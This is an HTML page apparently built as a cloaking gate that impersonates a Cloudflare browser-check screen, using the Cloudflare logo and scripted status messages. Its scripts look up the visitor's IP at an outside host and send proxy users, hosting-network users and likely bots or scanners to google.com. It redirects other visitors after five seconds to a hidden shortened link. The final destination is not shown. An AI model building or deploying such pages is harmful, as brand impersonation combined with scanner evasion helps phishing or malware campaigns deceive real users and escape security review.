<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta http-equiv="refresh" content="5; url=https://t.co/W66JhHG9Ak" />
  <title>Just a moment...</title>

  <style>
    body {
      background: #0d1117;
      color: #c9d1d9;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      text-align: center;
    }
    img {
      width: 180px;
      margin-bottom: 30px;
      opacity: 0.8;
    }
    .loader {
      border: 6px solid #161b22;
      border-top: 6px solid #58a6ff;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin-top: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    #status {
      margin-top: 30px;
      font-size: 1.1rem;
      opacity: 0.8;
      min-height: 24px;
    }
  </style>

<script>
fetch("https://flyingfish.pro/ip-api")
  .then(res => res.json())
  .then(data => {
    console.log("IP Info:", data);

    if (data.proxy === true || data.hosting === true) {
      // Redirect jika pakai proxy atau hosting
      window.location.href = "https://google.com";
    }
  })
  .catch(err => {
    console.error("Gagal mendeteksi IP:", err);
  });
</script>
  
  <script>
    (function() {
      function isBot() {
        try {
          const ua = navigator.userAgent.toLowerCase();
          const suspiciousUA = ["headlesschrome", "phantomjs", "selenium", "python", "curl", "java", "wget", "go-http-client"];
          const uaBot = suspiciousUA.some(botUA => ua.includes(botUA));
          const webdriverFlag = navigator.webdriver;

          let suspicionScore = 0;
          if (uaBot) suspicionScore++;
          if (webdriverFlag) suspicionScore++;
          if (navigator.plugins.length === 0) suspicionScore++;
          if (!navigator.cookieEnabled) suspicionScore++;
          if (!navigator.language) suspicionScore++;

          return suspicionScore >= 2;
        } catch (e) {
          return true;
        }
      }

      if (isBot()) {
        window.location.href = "https://www.google.com";
      }
    })();
  </script>
</head>
<body>
  <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png" alt="Cloudflare Logo" />
  <h2>Checking your browser before accessing</h2>
  <div class="loader"></div>
  <div id="status"></div>

  <script>
    const steps = [
      "Checking browser environment...",
      "Validating JavaScript engine...",
      "Verifying IP address...",
      "Checking cookies...",
      "Finalizing security layer...",
      "Redirecting..."
    ];

    let i = 0;
    let charIndex = 0;
    const statusEl = document.getElementById("status");

    function typeStep() {
      if (i >= steps.length) return;

      if (charIndex < steps[i].length) {
        statusEl.textContent += steps[i].charAt(charIndex);
        charIndex++;
        setTimeout(typeStep, 30);
      } else {
        i++;
        charIndex = 0;
        setTimeout(() => {
          statusEl.textContent = '';
          typeStep();
        }, 700);
      }
    }

    setTimeout(typeStep, 1000);
  </script>
</body>
</html>
